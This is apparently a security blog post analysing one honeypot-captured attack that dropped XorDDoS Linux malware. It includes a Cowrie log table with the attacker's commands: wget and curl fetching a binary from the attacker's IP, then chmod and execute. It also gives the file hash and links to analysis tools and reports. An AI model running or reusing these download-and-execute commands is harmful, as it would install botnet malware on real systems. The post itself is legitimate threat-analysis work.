---
layout: post
title:  "Analysing Honeypots Running In T-PoT Part 03"
date:   2020-04-19 16:58:32 +0200
categories: alecsahew github.io Cowrie T-Pot Honeypot Analysis
---

### What We Can Learn From 24 Hours Attack in COVID-19 Times.  Analysing Cowrie

#### Attacker's Malware Dropped: XorDDoS 

XOR DDoS are Denial of Service Attacks. 
XOR DDoS is a Trojan malware that infects Linux systems.
Attackers build botnets using compromised Linux systems to launch DDoS attacks.

#### THE INPUT FROM ASN : GorillaServers, Inc. Los Angeles	

##### Attackers gain access by brute force attacks to discover the password to Secure Shell services on a Linux machine
##### Once login has been acquired, the attackers use root privileges to run a Bash shell script that downloads and executes the binary

|COWRIE                           |INPUT                               
|:--------------------------------|:-------------------------------------------------------------------------------------------------|
|cowrie.session.connect|New connection: 98.159.110.2:46509 (192.168.96.2:22) [session: 864d91ae1ed0]|
|cowrie.client.version|Remote SSH version: b'SSH-2.0-PUTTY'|
|cowrie.client.kex|SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b|
|cowrie.login.success||
|cowrie.session.params||
|cowrie.login.input |#!/bin/sh;
|cowrie.login.input |PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;| 
|cowrie.login.input |wget http://98.159.110.2/3307;|
|cowrie.login.input |curl -O http://98.159.110.2/3307;|
|cowrie.login.input |chmod +x 3307; ./3307;|
|cowrie.session.file_upload|SFTP Uploaded file "eyshcjdmzg" to dl/1a0aa7fcea196af6d24df531da131833b4b13b3e629e15d1b346062d7ec259e6|
|cowrie.session.params||
|cowrie.command.input|	CMD: /bin/eyshcjdmzg|
|cowrie.command.failed|Command not found: /bin/eyshcjdmzg|
|cowrie.log.closed|Closing TTY Log: log/tty/27bfa685b0774a88946b7b3f3d0f6291bcc8e0ae37769309a8d086593862c0d0 after 10 seconds|
|cowrie.session.params||
|cowrie.command.input|CMD: ls -la /var/run/gcc.pid|
|cowrie.log.closed|Closing TTY Log: log/tty/e9ca076a73c58dc3b053e9f3e0249b13f1c1b47d23846405096e8c10dc3f7d26 after 0 seconds|

#### Statics Analysis With Internet Tools 

* [Virus Total][xorddos01-lnk]                                                                                       
* [AbuseIP DB][xorddos02-lnk]                                                                                   

#### Statics Analysis With Other Tools 

* Basic Linux commands: file, strings, readelf     
* [Ghydra  A software reverse engineering (SRE)][xorddos03-lnk]  
                    
#### Dynamic Analysis

* [joesandbox.com/analysis][xorddos06-lnk]

#### Other Analysis Of XorDDoS

* [XOR DDoS Botnet Launching 20 Attacks a Day From Compromised Linux Machines, Says Akamai][xorddos04-lnk]             
* [MMD-0028-2014 - Linux/XOR.DDoS : Fuzzy reversing a new China ELF][xorddos05-lnk]                  


[xorddos01-lnk]:https://www.virustotal.com/gui/file/1a0aa7fcea196af6d24df531da131833b4b13b3e629e15d1b346062d7ec259e6/detection
[xorddos02-lnk]:https://www.abuseipdb.com/check/98.159.110.2
[xorddos03-lnk]:https://ghidra-sre.org/
[xorddos04-lnk]:https://www.akamai.com/us/en/about/news/press/2015-press/xor-ddos-botnet-attacking-linux-machines.jsp
[xorddos05-lnk]:https://blog.malwaremustdie.org/2014/09/mmd-0028-2014-fuzzy-reversing-new-china.html
[xorddos06-lnk]:https://www.joesandbox.com/analysis/216148/0/html



